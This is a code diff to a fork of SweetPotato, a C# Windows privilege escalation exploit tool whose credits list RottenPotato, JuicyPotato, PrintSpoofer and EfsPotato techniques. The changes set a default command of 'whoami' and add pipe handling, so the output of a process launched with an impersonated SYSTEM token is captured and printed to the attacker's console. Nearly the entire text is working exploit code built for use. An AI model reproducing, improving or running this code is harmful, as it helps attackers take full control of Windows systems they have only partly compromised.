@@ -4,9 +4,9 @@ using System;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Threading;
-using static SweetPotato.ImpersonationToken;
+using static SweetPotatoNew.ImpersonationToken;
 
-namespace SweetPotato {
+namespace SweetPotatoNew {
     class Program {
 
         static void PrintHelp(OptionSet options) {                
@@ -18,7 +18,7 @@ namespace SweetPotato {
             string clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
             ushort port = 6666;
             string program = @"c:\Windows\System32\cmd.exe";
-            string programArgs = null;
+            string programArgs = "whoami";
             ExecutionMethod executionMethod = ExecutionMethod.Auto;
             PotatoAPI.Mode mode = PotatoAPI.Mode.PrintSpoofer;
             bool showHelp = false;
@@ -29,7 +29,8 @@ namespace SweetPotato {
                  "  Orignal RottenPotato code and exploit by @foxglovesec\n" +
                  "  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n" + 
                  "  PrintSpoofer discovery and original exploit by @itm4n\n" +
-                 "  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam"
+                 "  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam\n" +
+                 "  Add NtApiDotNet embedded & execution output catching by Brian.W AKA BigCHAN\n"
                 );
 
             OptionSet option_set = new OptionSet()
@@ -101,21 +102,40 @@ namespace SweetPotato {
                     Console.WriteLine("[!] Failed to impersonate security context token");
                     return;
                 }
+                SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
+                saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
+                saAttr.bInheritHandle = 0x1;
+                saAttr.lpSecurityDescriptor = IntPtr.Zero;
 
+                if (CreatePipe(ref out_read, ref out_write, ref saAttr, 0))
+                {
+                    Console.WriteLine("[+] CreatePipe success");
+                }
+                SetHandleInformation(out_read, HANDLE_FLAG_INHERIT, 0);
+                SetHandleInformation(err_read, HANDLE_FLAG_INHERIT, 0);
                 Thread systemThread = new Thread(() => {
                     SetThreadToken(IntPtr.Zero, potatoAPI.Token);
                     STARTUPINFO si = new STARTUPINFO();
                     PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                     si.cb = Marshal.SizeOf(si);
                     si.lpDesktop = @"WinSta0\Default";
+                    si.hStdOutput = out_write;
+                    si.hStdError = err_write;
+                    si.dwFlags |= STARTF_USESTDHANDLES;
 
                     //Console.WriteLine("[+] Created launch thread using impersonated user {0}", WindowsIdentity.GetCurrent(true).Name);
 
                     string finalArgs = null;
 
                     if(programArgs != null)
+                    {
+                        if (program.Equals("c:\\Windows\\System32\\cmd.exe"))
+                        {
+                            programArgs = "/c " + programArgs;
+                        }
                         finalArgs = string.Format("\"{0}\" {1}", program, programArgs);
-
+                        Console.WriteLine("[+] Command : {0} ", finalArgs);
+                    }
                     if (executionMethod == ExecutionMethod.Token) {
                         if (!CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out pi)) {
                             Console.WriteLine("[!] Failed to created impersonated process with token: {0}", Marshal.GetLastWin32Error());
@@ -128,6 +148,16 @@ namespace SweetPotato {
                             return;
                         }
                     }
+                    CloseHandle(out_write);
+                    byte[] buf = new byte[BUFSIZE];
+                    int dwRead = 0;
+                    while (ReadFile(out_read, buf, BUFSIZE, ref dwRead, IntPtr.Zero))
+                    {
+                        byte[] outBytes = new byte[dwRead];
+                        Array.Copy(buf, outBytes, dwRead);
+                        Console.WriteLine(System.Text.Encoding.Default.GetString(outBytes));
+                    }
+                    CloseHandle(out_read);
                     Console.WriteLine("[+] Process created, enjoy!");
                 });
 
